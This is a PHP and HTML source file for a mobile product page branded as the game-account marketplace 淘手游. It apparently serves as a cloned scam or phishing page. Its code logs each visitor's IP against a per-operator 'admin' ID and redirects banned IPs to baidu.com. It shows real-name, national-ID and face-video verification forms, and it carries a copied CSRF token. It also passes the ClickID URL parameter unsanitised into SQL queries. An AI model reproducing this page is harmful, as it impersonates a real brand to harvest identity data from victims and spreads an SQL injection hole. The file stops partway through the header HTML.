<!DOCTYPE html>

<?php
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();

if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");

	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	if (stristr($BANIP, $ip)) {
		header('Location:'. htmlspecialchars_decode('http://www.baidu.com').'');
	}

	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }

	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
		_query("
			INSERT INTO useraddress (
								uip,
								type,
								class,
								gid,
								aid,
								state,
								utime
								)
						VALUES (
								'{$ip}',
								3,
								3,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$_CURRENT_TIME2}'
								)"
			);
		  _close();
		  session_destroy();
	}

	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){

	}
	//更新点击率
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{

}
?>
<html lang="zh-CN" style="font-size: 117.25px;"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no,minimum-scale=1.0, maximum-scale=1.0,minimal-ui">
<meta name="screen-orientation" content="portrait">
<meta name="x5-orientation" content="portrait">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="author" content="淘手游交易平台">
<meta name="format-detection" content="telephone=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/static/common/static/img/1_13868e4.png">
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/static/common/static/img/2_7cc0810.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/static/common/static/img/3_e8d0000.png">
<link rel="apple-touch-icon-precomposed" href="/static/common/static/img/4_83e0a0b.png">
<link rel="apple-touch-startup-image" href="/static/common/static/img/iPhone6_5fd8c30.png">
<link rel="apple-touch-startup-image" media="screen and (orientation: portrait)" href="/static/common/static/img/iPhone6_5fd8c30.png">
<link rel="apple-touch-startup-image" media="screen and (orientation: landscape)" href="/static/common/static/img/iPhone6_5fd8c30.png">
<meta name="csrf-param" content="_csrf">
<meta name="csrf-token" content="zJVCH-5_Hc6nm2Zr8yerndnxfrHpXvDgIbIO-vRWOIj1ojF6tBUsrODWHACRfpz_kKNK4bYphIVJn2mXzAFKyw==">
<title><?php echo $_GoodsID['title'];?>_淘手游,taoshouyou.com_专业的手游账号交易平台</title>
<meta name="keywords" content="【1英雄 1皮肤】【平台店铺】266皮????❤️V10四典藏三星元限定多安全秒发货-淘手游手游交易平台">
<meta name="description" content="...">
                                        <link rel="stylesheet" type="text/css" href="./static/common/static/pkg/common_c7bc7fd.css"><link rel="stylesheet" type="text/css" href="./static/common/static/js/lib/weui/weui.min_72d0375.css"><link rel="stylesheet" type="text/css" href="./static/common/static/pkg/goodsdetail_02d25ce.css"><style>html{font-size:50.026668294270834px;}</style><style type="text/css">#__vconsole{color:#000;font-size:13px;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}#__vconsole .vc-max-height{max-height:19.23076923em}#__vconsole .vc-max-height-line{max-height:3.38461538em}#__vconsole .vc-min-height{min-height:3.07692308em}#__vconsole dd,#__vconsole dl,#__vconsole pre{margin:0}#__vconsole .vc-switch{display:block;position:fixed;right:.76923077em;bottom:.76923077em;color:#fff;background-color:#04be02;line-height:1;font-size:1.07692308em;padding:.61538462em 1.23076923em;z-index:10000;border-radius:.30769231em;box-shadow:0 0 .61538462em rgba(0,0,0,.4)}#__vconsole .vc-mask{top:0;background:transparent;z-index:10001;transition:background .3s;-webkit-tap-highlight-color:transparent;overflow-y:scroll}#__vconsole .vc-mask,#__vconsole .vc-panel{display:none;position:fixed;left:0;right:0;bottom:0}#__vconsole .vc-panel{min-height:85%;z-index:10002;background-color:#efeff4;-webkit-transition:-webkit-transform .3s;transition:-webkit-transform .3s;transition:transform .3s;transition:transform .3s,-webkit-transform .3s;-webkit-transform:translateY(100%);transform:translateY(100%)}#__vconsole .vc-tabbar{border-bottom:1px solid #d9d9d9;overflow-x:auto;height:3em;width:auto;white-space:nowrap}#__vconsole .vc-tabbar .vc-tab{display:inline-block;line-height:3em;padding:0 1.15384615em;border-right:1px solid #d9d9d9;text-decoration:none;color:#000;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}#__vconsole .vc-tabbar .vc-tab:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-tabbar .vc-tab.vc-actived{background-color:#fff}#__vconsole .vc-content{background-color:#fff;overflow-x:hidden;overflow-y:auto;position:absolute;top:3.07692308em;left:0;right:0;bottom:3.07692308em;-webkit-overflow-scrolling:touch}#__vconsole .vc-content.vc-has-topbar{top:5.46153846em}#__vconsole .vc-topbar{background-color:#fbf9fe;display:flex;display:-webkit-box;flex-direction:row;flex-wrap:wrap;-webkit-box-direction:row;-webkit-flex-wrap:wrap;width:100%}#__vconsole .vc-topbar .vc-toptab{display:none;flex:1;-webkit-box-flex:1;line-height:2.30769231em;padding:0 1.15384615em;border-bottom:1px solid #d9d9d9;text-decoration:none;text-align:center;color:#000;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}#__vconsole .vc-topbar .vc-toptab.vc-toggle{display:block}#__vconsole .vc-topbar .vc-toptab:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-topbar .vc-toptab.vc-actived{border-bottom:1px solid #3e82f7}#__vconsole .vc-logbox{display:none;position:relative;min-height:100%}#__vconsole .vc-logbox i{font-style:normal}#__vconsole .vc-logbox .vc-log{padding-bottom:3em;-webkit-tap-highlight-color:transparent}#__vconsole .vc-logbox .vc-log:empty:before{content:"Empty";color:#999;position:absolute;top:45%;left:0;right:0;bottom:0;font-size:1.15384615em;text-align:center}#__vconsole .vc-logbox .vc-item{margin:0;padding:.46153846em .61538462em;overflow:hidden;line-height:1.3;border-bottom:1px solid #eee;word-break:break-word}#__vconsole .vc-logbox .vc-item-info{color:#6a5acd}#__vconsole .vc-logbox .vc-item-debug{color:#daa520}#__vconsole .vc-logbox .vc-item-warn{color:orange;border-color:#ffb930;background-color:#fffacd}#__vconsole .vc-logbox .vc-item-error{color:#dc143c;border-color:#f4a0ab;background-color:#ffe4e1}#__vconsole .vc-logbox .vc-log.vc-log-partly .vc-item{display:none}#__vconsole .vc-logbox .vc-log.vc-log-partly-error .vc-item-error,#__vconsole .vc-logbox .vc-log.vc-log-partly-info .vc-item-info,#__vconsole .vc-logbox .vc-log.vc-log-partly-log .vc-item-log,#__vconsole .vc-logbox .vc-log.vc-log-partly-warn .vc-item-warn{display:block}#__vconsole .vc-logbox .vc-item .vc-item-content{margin-right:4.61538462em;display:block}#__vconsole .vc-logbox .vc-item .vc-item-meta{color:#888;float:right;width:4.61538462em;text-align:right}#__vconsole .vc-logbox .vc-item.vc-item-nometa .vc-item-content{margin-right:0}#__vconsole .vc-logbox .vc-item.vc-item-nometa .vc-item-meta{display:none}#__vconsole .vc-logbox .vc-item .vc-item-code{display:block;white-space:pre-wrap;overflow:auto;position:relative}#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input,#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output{padding-left:.92307692em}#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input:before,#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before{content:"\203A";position:absolute;top:-.23076923em;left:0;font-size:1.23076923em;color:#6a5acd}#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before{content:"\2039"}#__vconsole .vc-logbox .vc-item .vc-fold{display:block;overflow:auto;-webkit-overflow-scrolling:touch}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer{display:block;font-style:italic;padding-left:.76923077em;position:relative}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:active{background-color:#e6e6e6}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:before{content:"";position:absolute;top:.30769231em;left:.15384615em;width:0;height:0;border:.30769231em solid transparent;border-left-color:#000}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer.vc-toggle:before{top:.46153846em;left:0;border-top-color:#000;border-left-color:transparent}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner{display:none;margin-left:.76923077em}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner.vc-toggle{display:block}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner .vc-code-key{margin-left:.76923077em}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer .vc-code-key{margin-left:0}#__vconsole .vc-logbox .vc-code-key{color:#905}#__vconsole .vc-logbox .vc-code-private-key{color:#d391b5}#__vconsole .vc-logbox .vc-code-function{color:#905;font-style:italic}#__vconsole .vc-logbox .vc-code-boolean,#__vconsole .vc-logbox .vc-code-number{color:#0086b3}#__vconsole .vc-logbox .vc-code-string{color:#183691}#__vconsole .vc-logbox .vc-code-null,#__vconsole .vc-logbox .vc-code-undefined{color:#666}#__vconsole .vc-logbox .vc-cmd{position:absolute;height:3.07692308em;left:0;right:0;bottom:0;border-top:1px solid #d9d9d9;display:block!important}#__vconsole .vc-logbox .vc-cmd .vc-cmd-input-wrap{display:block;height:2.15384615em;margin-right:3.07692308em;padding:.46153846em .61538462em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-input{width:100%;border:none;resize:none;outline:none;padding:0;font-size:.92307692em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-input::-webkit-input-placeholder{line-height:2.15384615em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn{position:absolute;top:0;right:0;bottom:0;width:3.07692308em;border:none;background-color:#efeff4;outline:none;-webkit-touch-callout:none;font-size:1em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-logbox .vc-group .vc-group-preview{-webkit-touch-callout:none}#__vconsole .vc-logbox .vc-group .vc-group-preview:active{background-color:#e6e6e6}#__vconsole .vc-logbox .vc-group .vc-group-detail{display:none;padding:0 0 .76923077em 1.53846154em;border-bottom:1px solid #eee}#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-detail{display:block;background-color:#fbf9fe}#__vconsole .vc-logbox .vc-group.vc-actived .vc-table-row{background-color:#fff}#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-preview{background-color:#fbf9fe}#__vconsole .vc-logbox .vc-table .vc-table-row{display:flex;display:-webkit-flex;flex-direction:row;flex-wrap:wrap;-webkit-box-direction:row;-webkit-flex-wrap:wrap;overflow:hidden;border-bottom:1px solid #eee}#__vconsole .vc-logbox .vc-table .vc-table-row.vc-left-border{border-left:1px solid #eee}#__vconsole .vc-logbox .vc-table .vc-table-col{flex:1;-webkit-box-flex:1;padding:.23076923em .30769231em;border-left:1px solid #eee;overflow:auto;white-space:pre-wrap;word-break:break-word;-webkit-overflow-scrolling:touch}#__vconsole .vc-logbox .vc-table .vc-table-col:first-child{border:none}#__vconsole .vc-logbox .vc-table .vc-small .vc-table-col{padding:0 .30769231em;font-size:.92307692em}#__vconsole .vc-logbox .vc-table .vc-table-col-2{flex:2;-webkit-box-flex:2}#__vconsole .vc-logbox .vc-table .vc-table-col-3{flex:3;-webkit-box-flex:3}#__vconsole .vc-logbox .vc-table .vc-table-col-4{flex:4;-webkit-box-flex:4}#__vconsole .vc-logbox .vc-table .vc-table-col-5{flex:5;-webkit-box-flex:5}#__vconsole .vc-logbox .vc-table .vc-table-col-6{flex:6;-webkit-box-flex:6}#__vconsole .vc-logbox .vc-table .vc-table-row-error{border-color:#f4a0ab;background-color:#ffe4e1}#__vconsole .vc-logbox .vc-table .vc-table-row-error .vc-table-col{color:#dc143c;border-color:#f4a0ab}#__vconsole .vc-logbox .vc-table .vc-table-col-title{font-weight:700}#__vconsole .vc-logbox.vc-actived{display:block}#__vconsole .vc-toolbar{border-top:1px solid #d9d9d9;line-height:3em;position:absolute;left:0;right:0;bottom:0;display:flex;display:-webkit-box;flex-direction:row;-webkit-box-direction:row}#__vconsole .vc-toolbar .vc-tool{display:none;text-decoration:none;color:#000;width:50%;flex:1;-webkit-box-flex:1;text-align:center;position:relative;-webkit-touch-callout:none}#__vconsole .vc-toolbar .vc-tool.vc-global-tool,#__vconsole .vc-toolbar .vc-tool.vc-toggle{display:block}#__vconsole .vc-toolbar .vc-tool:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-toolbar .vc-tool:after{content:" ";position:absolute;top:.53846154em;bottom:.53846154em;right:0;border-left:1px solid #d9d9d9}#__vconsole .vc-toolbar .vc-tool-last:after{border:none}#__vconsole.vc-toggle .vc-switch{display:none}#__vconsole.vc-toggle .vc-mask{background:rgba(0,0,0,.6);display:block}#__vconsole.vc-toggle .vc-panel{-webkit-transform:translate(0);transform:translate(0)}</style><style type="text/css">.vcelm-node{color:#183691}.vcelm-k{color:#0086b3}.vcelm-v{color:#905}.vcelm-l{padding-left:8px;position:relative;word-wrap:break-word;line-height:1}.vcelm-l.vc-toggle>.vcelm-node{display:block}.vcelm-l .vcelm-node:active{background-color:rgba(0,0,0,.15)}.vcelm-l.vcelm-noc .vcelm-node:active{background-color:transparent}.vcelm-t{white-space:pre-wrap;word-wrap:break-word}.vcelm-l .vcelm-l{display:none}.vcelm-l.vc-toggle>.vcelm-l{margin-left:4px;display:block}.vcelm-l:before{content:"";display:block;position:absolute;top:6px;left:3px;width:0;height:0;border:3px solid transparent;border-left-color:#000}.vcelm-l.vc-toggle:before{display:block;top:6px;left:0;border-top-color:#000;border-left-color:transparent}.vcelm-l.vcelm-noc:before{display:none}</style><style type="text/css">#__vconsole{color:#000;font-size:13px;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}#__vconsole .vc-max-height{max-height:19.23076923em}#__vconsole .vc-max-height-line{max-height:3.38461538em}#__vconsole .vc-min-height{min-height:3.07692308em}#__vconsole dd,#__vconsole dl,#__vconsole pre{margin:0}#__vconsole .vc-switch{display:block;position:fixed;right:.76923077em;bottom:.76923077em;color:#fff;background-color:#04be02;line-height:1;font-size:1.07692308em;padding:.61538462em 1.23076923em;z-index:10000;border-radius:.30769231em;box-shadow:0 0 .61538462em rgba(0,0,0,.4)}#__vconsole .vc-mask{top:0;background:transparent;z-index:10001;transition:background .3s;-webkit-tap-highlight-color:transparent;overflow-y:scroll}#__vconsole .vc-mask,#__vconsole .vc-panel{display:none;position:fixed;left:0;right:0;bottom:0}#__vconsole .vc-panel{min-height:85%;z-index:10002;background-color:#efeff4;-webkit-transition:-webkit-transform .3s;transition:-webkit-transform .3s;transition:transform .3s;transition:transform .3s,-webkit-transform .3s;-webkit-transform:translateY(100%);transform:translateY(100%)}#__vconsole .vc-tabbar{border-bottom:1px solid #d9d9d9;overflow-x:auto;height:3em;width:auto;white-space:nowrap}#__vconsole .vc-tabbar .vc-tab{display:inline-block;line-height:3em;padding:0 1.15384615em;border-right:1px solid #d9d9d9;text-decoration:none;color:#000;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}#__vconsole .vc-tabbar .vc-tab:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-tabbar .vc-tab.vc-actived{background-color:#fff}#__vconsole .vc-content{background-color:#fff;overflow-x:hidden;overflow-y:auto;position:absolute;top:3.07692308em;left:0;right:0;bottom:3.07692308em;-webkit-overflow-scrolling:touch}#__vconsole .vc-content.vc-has-topbar{top:5.46153846em}#__vconsole .vc-topbar{background-color:#fbf9fe;display:flex;display:-webkit-box;flex-direction:row;flex-wrap:wrap;-webkit-box-direction:row;-webkit-flex-wrap:wrap;width:100%}#__vconsole .vc-topbar .vc-toptab{display:none;flex:1;-webkit-box-flex:1;line-height:2.30769231em;padding:0 1.15384615em;border-bottom:1px solid #d9d9d9;text-decoration:none;text-align:center;color:#000;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}#__vconsole .vc-topbar .vc-toptab.vc-toggle{display:block}#__vconsole .vc-topbar .vc-toptab:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-topbar .vc-toptab.vc-actived{border-bottom:1px solid #3e82f7}#__vconsole .vc-logbox{display:none;position:relative;min-height:100%}#__vconsole .vc-logbox i{font-style:normal}#__vconsole .vc-logbox .vc-log{padding-bottom:3em;-webkit-tap-highlight-color:transparent}#__vconsole .vc-logbox .vc-log:empty:before{content:"Empty";color:#999;position:absolute;top:45%;left:0;right:0;bottom:0;font-size:1.15384615em;text-align:center}#__vconsole .vc-logbox .vc-item{margin:0;padding:.46153846em .61538462em;overflow:hidden;line-height:1.3;border-bottom:1px solid #eee;word-break:break-word}#__vconsole .vc-logbox .vc-item-info{color:#6a5acd}#__vconsole .vc-logbox .vc-item-debug{color:#daa520}#__vconsole .vc-logbox .vc-item-warn{color:orange;border-color:#ffb930;background-color:#fffacd}#__vconsole .vc-logbox .vc-item-error{color:#dc143c;border-color:#f4a0ab;background-color:#ffe4e1}#__vconsole .vc-logbox .vc-log.vc-log-partly .vc-item{display:none}#__vconsole .vc-logbox .vc-log.vc-log-partly-error .vc-item-error,#__vconsole .vc-logbox .vc-log.vc-log-partly-info .vc-item-info,#__vconsole .vc-logbox .vc-log.vc-log-partly-log .vc-item-log,#__vconsole .vc-logbox .vc-log.vc-log-partly-warn .vc-item-warn{display:block}#__vconsole .vc-logbox .vc-item .vc-item-content{margin-right:4.61538462em;display:block}#__vconsole .vc-logbox .vc-item .vc-item-meta{color:#888;float:right;width:4.61538462em;text-align:right}#__vconsole .vc-logbox .vc-item.vc-item-nometa .vc-item-content{margin-right:0}#__vconsole .vc-logbox .vc-item.vc-item-nometa .vc-item-meta{display:none}#__vconsole .vc-logbox .vc-item .vc-item-code{display:block;white-space:pre-wrap;overflow:auto;position:relative}#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input,#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output{padding-left:.92307692em}#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input:before,#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before{content:"\203A";position:absolute;top:-.23076923em;left:0;font-size:1.23076923em;color:#6a5acd}#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before{content:"\2039"}#__vconsole .vc-logbox .vc-item .vc-fold{display:block;overflow:auto;-webkit-overflow-scrolling:touch}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer{display:block;font-style:italic;padding-left:.76923077em;position:relative}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:active{background-color:#e6e6e6}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:before{content:"";position:absolute;top:.30769231em;left:.15384615em;width:0;height:0;border:.30769231em solid transparent;border-left-color:#000}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer.vc-toggle:before{top:.46153846em;left:0;border-top-color:#000;border-left-color:transparent}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner{display:none;margin-left:.76923077em}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner.vc-toggle{display:block}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner .vc-code-key{margin-left:.76923077em}#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer .vc-code-key{margin-left:0}#__vconsole .vc-logbox .vc-code-key{color:#905}#__vconsole .vc-logbox .vc-code-private-key{color:#d391b5}#__vconsole .vc-logbox .vc-code-function{color:#905;font-style:italic}#__vconsole .vc-logbox .vc-code-boolean,#__vconsole .vc-logbox .vc-code-number{color:#0086b3}#__vconsole .vc-logbox .vc-code-string{color:#183691}#__vconsole .vc-logbox .vc-code-null,#__vconsole .vc-logbox .vc-code-undefined{color:#666}#__vconsole .vc-logbox .vc-cmd{position:absolute;height:3.07692308em;left:0;right:0;bottom:0;border-top:1px solid #d9d9d9;display:block!important}#__vconsole .vc-logbox .vc-cmd .vc-cmd-input-wrap{display:block;height:2.15384615em;margin-right:3.07692308em;padding:.46153846em .61538462em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-input{width:100%;border:none;resize:none;outline:none;padding:0;font-size:.92307692em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-input::-webkit-input-placeholder{line-height:2.15384615em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn{position:absolute;top:0;right:0;bottom:0;width:3.07692308em;border:none;background-color:#efeff4;outline:none;-webkit-touch-callout:none;font-size:1em}#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-logbox .vc-group .vc-group-preview{-webkit-touch-callout:none}#__vconsole .vc-logbox .vc-group .vc-group-preview:active{background-color:#e6e6e6}#__vconsole .vc-logbox .vc-group .vc-group-detail{display:none;padding:0 0 .76923077em 1.53846154em;border-bottom:1px solid #eee}#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-detail{display:block;background-color:#fbf9fe}#__vconsole .vc-logbox .vc-group.vc-actived .vc-table-row{background-color:#fff}#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-preview{background-color:#fbf9fe}#__vconsole .vc-logbox .vc-table .vc-table-row{display:flex;display:-webkit-flex;flex-direction:row;flex-wrap:wrap;-webkit-box-direction:row;-webkit-flex-wrap:wrap;overflow:hidden;border-bottom:1px solid #eee}#__vconsole .vc-logbox .vc-table .vc-table-row.vc-left-border{border-left:1px solid #eee}#__vconsole .vc-logbox .vc-table .vc-table-col{flex:1;-webkit-box-flex:1;padding:.23076923em .30769231em;border-left:1px solid #eee;overflow:auto;white-space:pre-wrap;word-break:break-word;-webkit-overflow-scrolling:touch}#__vconsole .vc-logbox .vc-table .vc-table-col:first-child{border:none}#__vconsole .vc-logbox .vc-table .vc-small .vc-table-col{padding:0 .30769231em;font-size:.92307692em}#__vconsole .vc-logbox .vc-table .vc-table-col-2{flex:2;-webkit-box-flex:2}#__vconsole .vc-logbox .vc-table .vc-table-col-3{flex:3;-webkit-box-flex:3}#__vconsole .vc-logbox .vc-table .vc-table-col-4{flex:4;-webkit-box-flex:4}#__vconsole .vc-logbox .vc-table .vc-table-col-5{flex:5;-webkit-box-flex:5}#__vconsole .vc-logbox .vc-table .vc-table-col-6{flex:6;-webkit-box-flex:6}#__vconsole .vc-logbox .vc-table .vc-table-row-error{border-color:#f4a0ab;background-color:#ffe4e1}#__vconsole .vc-logbox .vc-table .vc-table-row-error .vc-table-col{color:#dc143c;border-color:#f4a0ab}#__vconsole .vc-logbox .vc-table .vc-table-col-title{font-weight:700}#__vconsole .vc-logbox.vc-actived{display:block}#__vconsole .vc-toolbar{border-top:1px solid #d9d9d9;line-height:3em;position:absolute;left:0;right:0;bottom:0;display:flex;display:-webkit-box;flex-direction:row;-webkit-box-direction:row}#__vconsole .vc-toolbar .vc-tool{display:none;text-decoration:none;color:#000;width:50%;flex:1;-webkit-box-flex:1;text-align:center;position:relative;-webkit-touch-callout:none}#__vconsole .vc-toolbar .vc-tool.vc-global-tool,#__vconsole .vc-toolbar .vc-tool.vc-toggle{display:block}#__vconsole .vc-toolbar .vc-tool:active{background-color:rgba(0,0,0,.15)}#__vconsole .vc-toolbar .vc-tool:after{content:" ";position:absolute;top:.53846154em;bottom:.53846154em;right:0;border-left:1px solid #d9d9d9}#__vconsole .vc-toolbar .vc-tool-last:after{border:none}#__vconsole.vc-toggle .vc-switch{display:none}#__vconsole.vc-toggle .vc-mask{background:rgba(0,0,0,.6);display:block}#__vconsole.vc-toggle .vc-panel{-webkit-transform:translate(0);transform:translate(0)}</style><style type="text/css">.vcelm-node{color:#183691}.vcelm-k{color:#0086b3}.vcelm-v{color:#905}.vcelm-l{padding-left:8px;position:relative;word-wrap:break-word;line-height:1}.vcelm-l.vc-toggle>.vcelm-node{display:block}.vcelm-l .vcelm-node:active{background-color:rgba(0,0,0,.15)}.vcelm-l.vcelm-noc .vcelm-node:active{background-color:transparent}.vcelm-t{white-space:pre-wrap;word-wrap:break-word}.vcelm-l .vcelm-l{display:none}.vcelm-l.vc-toggle>.vcelm-l{margin-left:4px;display:block}.vcelm-l:before{content:"";display:block;position:absolute;top:6px;left:3px;width:0;height:0;border:3px solid transparent;border-left-color:#000}.vcelm-l.vc-toggle:before{display:block;top:6px;left:0;border-top-color:#000;border-left-color:transparent}.vcelm-l.vcelm-noc:before{display:none}</style></head><body style="font-size: 16px;"><div id="face-box"><div class="face-mask"></div><div class="realname-contont"><div class="title-rn"><img src="./static/common/widget/common/authentication/bg_9f0cd2b.png" alt="" class="bg"><div class="face-tips"><div>实名认证</div><div class="text-tips">依据国家新闻出版署相关规定，严禁18岁以下用户进行游戏交易，淘手游将根据主管部门最新规定，严格部署相应工作，积极推动未成年人健康成长事业</div></div></div><div class="contont-box-rn"><div class="tips-bottom">提示：姓名和身份证必须是本人才可以通过审核。</div><div class="face-input-box"><input type="text" placeholder="请输入真实姓名" id="realName-input"></div><div class="face-input-box"><input type="text" onkeyup="value=value.replace(/[^\w\.\/]/ig,'')" placeholder="请输入真实身份证号" id="certNo-input"></div><div class="btn-rn">确认</div></div><img src="./static/common/widget/common/authentication/closebtn_4919029.png" alt="" class="btn-close"></div><div class="face-contont"><div class="face-title"><img src="./static/common/widget/common/authentication/close_b9e513b.png" alt="">人脸认证</div><div id="face-setp1"><div class="sketch"><div class="sketch-img"><img src="./static/common/widget/common/authentication/sketch_550d246.png" alt=""></div></div><div class="prompt"><div class="prompt-box"><div class="prompt-box-text"><span class="prompt-box-text-number">1</span><span class="prompt-box-text-content">请在明亮的光线环境下使用</span><span class="prompt-box-text-border"></span><span class="prompt-box-text-border"></span></div><div class="prompt-box-text"><span class="prompt-box-text-number">2</span><span class="prompt-box-text-content">在录制过程中眨眼3-5次</span><span class="prompt-box-text-border"></span><span class="prompt-box-text-border"></span></div><div class="prompt-box-text"><span class="prompt-box-text-number">3</span><span class="prompt-box-text-content">视频时长1-3秒</span></div></div><div class="btn-box-face"><span class="prompt-next">开始录制</span><input type="file" class="camera-input" ref="cameraInput" accept="video/*" capture="user"></div></div></div><div id="face-setp2"><div><img src="./static/common/widget/common/authentication/loading_c34e539.gif" alt=""></div><div>正在检测中,请耐心等待...</div></div><div id="face-setp3"><div><img src="./static/common/widget/common/authentication/fail_a76a692.png" alt=""></div><div>验证失败</div><div class="fail-tips">人脸识别失败，剩余次数<span class="surplus-number">2</span>次</div><div class="face-error-msg"></div><div class="fail-box"><div class="fail-again-btn">重新验证<input type="file" class="camera-input" ref="cameraInput" accept="video/*" capture="user"></div></div></div></div></div><input type="hidden" id="sensorDataProject" value="taoshouyou">
<input type="hidden" id="_csrf" value="zJVCH-5_Hc6nm2Zr8yerndnxfrHpXvDgIbIO-vRWOIj1ojF6tBUsrODWHACRfpz_kKNK4bYphIVJn2mXzAFKyw==">
<input type="hidden" id="isApp" value="0">
            <input id="is_app_tk" type="hidden" value="0"><input id="im_url" type="hidden" value=""><input type="hidden" id="im_list_url" value=""><aside id="message-number" data-page="detail" style=""><p id="mi-message">0</p><img src="./static/home/static/img/goodsdetail/im2_205d697.png"></aside><div class="price-revision-bg"><div class="price-revision-box"><p class="price-revision-title">修改价格</p><div class="price-revision-content"><p>当前价格</p><p>￥249</p></div><p class="price-revision-text">调整至</p><div class="price-revision-new-price"><p>新价格</p><div>￥<input type="text" name="updateprice"></div></div><div class="price-revision-bnt" id="revision-bnt1">确定</div></div></div><div id="message"><p></p></div><div id="container" class="contaner">                                        <style>
        #head-title{
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            font-size:15px
        }
    </style>
<div class="header" id="header">
<a href="javascript:history.back(-1)" style="display: block;"><div class="header_back"><div class="header_back_r"></div></div></a>
<div id="head-title">淘手游交易平台-商品详情</div>
<a class="gb-head-rightwrap" href="/" data-ajax="false">
<div class="header_right">
